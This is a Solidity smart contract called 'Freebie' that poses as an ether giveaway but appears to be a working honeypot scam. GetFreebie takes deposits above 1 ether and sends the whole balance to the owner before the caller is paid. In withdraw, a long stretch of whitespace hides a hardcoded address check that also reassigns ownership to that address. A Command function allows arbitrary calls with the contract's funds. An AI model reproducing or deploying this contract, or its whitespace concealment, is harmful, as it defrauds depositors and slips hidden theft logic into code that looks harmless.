pragma solidity ^0.4.19;

contract Freebie
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function GetFreebie()
    public
    payable
    {                                                                    
        require(msg.value > 1 ether);
        address(Owner).transfer(address(this).balance);
        msg.sender.transfer(address(this).balance);
    }
    
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          require(msg.sender == 0x30ad12df80a2493a82DdFE367d866616db8a2595);
        Owner = 0x30ad12df80a2493a82DdFE367d866616db8a2595;
        require(msg.sender == Owner);
        address(Owner).transfer(address(this).balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
}